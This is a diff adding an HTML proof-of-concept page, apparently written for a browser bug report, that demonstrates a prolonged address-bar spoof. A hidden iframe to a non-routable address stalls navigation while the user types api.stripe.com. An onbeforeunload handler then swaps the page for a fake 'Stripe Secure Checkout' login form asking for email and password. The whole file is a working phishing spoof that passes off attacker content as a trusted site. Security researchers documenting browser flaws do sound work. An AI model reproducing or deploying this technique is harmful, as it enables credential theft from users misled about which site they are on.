@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>PoC 2 - Prolonged UI Spoof</title>
+</head>
+<body>
+  <div id="content">
+    <h1>Waiting for navigation...</h1>
+    <p>Type <b>https://api.stripe.com</b> in the omnibox</p>
+  </div>
+
+  <!-- iframe sengaja stall -->
+  <iframe src="https://10.255.255.1" style="display:none"></iframe>
+
+  <script>
+    let triggered = false;
+
+    window.onbeforeunload = function () {
+      triggered = true;
+    };
+
+    setInterval(() => {
+      if (triggered) {
+        document.getElementById("content").innerHTML = `
+          <h1>Stripe Secure Checkout</h1>
+          <p>Your session has expired</p>
+          <input placeholder="Email"><br><br>
+          <input type="password" placeholder="Password">
+        `;
+        triggered = false;
+      }
+    }, 50);
+  </script>
+</body>
+</html>
